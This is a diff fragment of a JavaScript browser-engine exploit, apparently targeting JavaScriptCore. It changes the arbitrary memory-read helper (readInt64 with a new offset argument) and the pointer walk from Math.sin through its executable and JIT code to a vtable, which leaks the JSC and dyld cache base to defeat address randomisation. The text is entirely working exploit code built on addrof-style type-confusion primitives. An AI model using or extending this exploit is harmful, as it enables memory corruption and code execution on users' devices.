@@ -557,8 +557,12 @@ for (var i = 0; i < 1000; ++i) {
             //victim1.prop = shared_butterfly;
             return res;
         },
-        readInt64: function(where) {
+        readInt64: function(where,offset) {
             //var reset = hax[1];
+	    if(offset) {
+                offset *= 8
+                return this.readInt64(where+offset);
+            }
             hax[1] = qwordAsFloat(where + 0x10);
             var res = this.addrof(victim1.prop);
             //hax[1] = reset;
@@ -632,14 +636,14 @@ for (var i = 0; i < 1000; ++i) {
    memory = stage2;
 	var sinFuncAddr = memory.addrof(Math.sin);
         print("Math.sin() @ " + sinFuncAddr);
-        var executableAddr = memory.read64(sinFuncAddr,3);
+        var executableAddr = memory.readInt64(Add(sinFuncAddr, new Int64("0x24")));
         print("Math.sin() ExecutableAddr @ " + executableAddr);
-        var jitCodeAddr = memory.read64(executableAddr,3);
+        var jitCodeAddr = memory.readInt64(Add(executableAddr,new Int64("0x24")));
 	print("Math.sin() jitCodeAddr @ " + jitCodeAddr);
         
-        var vtab = memory.read64(jitCodeAddr,0);
+        var vtab = memory.readInt64(jitCodeAddr);
         print("Math.sin() vtable @ " + vtab)
-        var anchor1 = memory.read64(vtab,0)
+        var anchor1 = memory.readInt64(vtab)
         print("anchor1" + anchor1);
         var jsc = Sub(anchor1, anchor1.lo() & 0xfff);
 	print('JSC header @' + jsc); //dyld_cache_header
